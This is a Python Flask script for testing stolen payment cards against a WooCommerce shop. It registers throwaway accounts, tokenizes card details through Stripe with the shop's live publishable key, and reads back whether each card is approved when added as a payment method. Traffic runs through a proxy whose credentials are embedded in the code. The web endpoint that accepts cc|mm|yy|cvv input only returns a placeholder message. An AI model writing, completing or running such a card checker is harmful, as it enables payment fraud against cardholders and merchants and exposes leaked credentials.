from flask import Flask, request, jsonify
import requests, re, random, string, sys, threading, time
app = Flask(__name__)
P_URL = "http://purevpn0s4863210:cq4naylqyfc1@px210404.pointtoserver.com:10780" 
S_PK = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
S_ACC = 'acct_1Mpulb2El1QixccJ'
class Gate:
    def __init__(self):
        self.s = requests.Session()
        if P_URL:
            self.s.proxies = {'http': P_URL, 'https': P_URL}
        
        self.s.headers.update({
            'authority': 'redbluechair.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'origin': 'https://redbluechair.com',
            'referer': 'https://redbluechair.com/my-account/',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-ch-ua': '\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\"Windows\"'
        })
    
    def rnd_str(self, l=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=l))
    def reg(self):
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/')
            n = re.search(r'name=\"woocommerce-register-nonce\" value=\"([^\"]+)\"', r1.text).group(1)
            rnd = self.rnd_str()
            dt = {
                'email': f'user{rnd}@gmail.com',
                'password': f'Pass{rnd}!!',
                'register': 'Register',
                'woocommerce-register-nonce': n,
                '_wp_http_referer': '/my-account/'
            }
            r2 = self.s.post('https://redbluechair.com/my-account/', data=dt)
            return "Log out" in r2.text
        except:
            return False
    def tok(self, cc, mm, yy, cvv):
        try:
            h = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': self.s.headers['user-agent']
            }
            d = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'key': S_PK,
                '_stripe_account': S_ACC,
                'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                'referrer': 'https://redbluechair.com',
                'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
                'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
            }
            r = requests.post('https://api.stripe.com/v1/payment_methods', headers=h, data=d)
            return r.json().get('id')
        except:
            return None
    def add(self, pm):
        try:
            r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/')
            txt = r1.text
            n = None
            m1 = re.search(r'\"createSetupIntentNonce\":\"([^\"]+)\"', txt)
            if m1: n = m1.group(1)
            if not n:
                m2 = re.search(r'\"createAndConfirmSetupIntentNonce\":\"([^\"]+)\"', txt)
                if m2: n = m2.group(1)
            if not n:
                m3 = re.search(r'\"create_setup_intent_nonce\":\"([a-z0-9]+)\"', txt)
                if m3: n = m3.group(1)
            
            if not n: return "Error"
            h = self.s.headers.copy()
            h.update({'x-requested-with': 'XMLHttpRequest', 'referer': 'https://redbluechair.com/my-account/add-payment-method/'})
            
            pl = {
                'action': (None, 'create_setup_intent'),
                'wcpay-payment-method': (None, pm),
                '_ajax_nonce': (None, n)
            }
            r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files=pl)
            js = r2.json()
            
            if js.get('success') is True:
                return "Approved"
            else:
                msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                return msg
        except:
            return "Error"
@app.route('/chk', methods=['GET'])
def check_card():
    card_details = request.args.get('card')  # Get 'card' parameter
    
    if not card_details:
        return jsonify({"error": "No card provided"}), 400
        
    sp = [s.strip() for s in card_details.split('|')]
    
    if len(sp) != 4 or any(s == "" for s in sp):
        return jsonify({"error": "Invalid format"}), 400
    
    cc, mm, yy, cvv = sp[0], sp[1], sp[2], sp[3]
    
    # Here you would add your validation logic
    result = f"Validated {cc} expiring {mm}/{yy}"
    
    return jsonify({"result": result}), 200
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
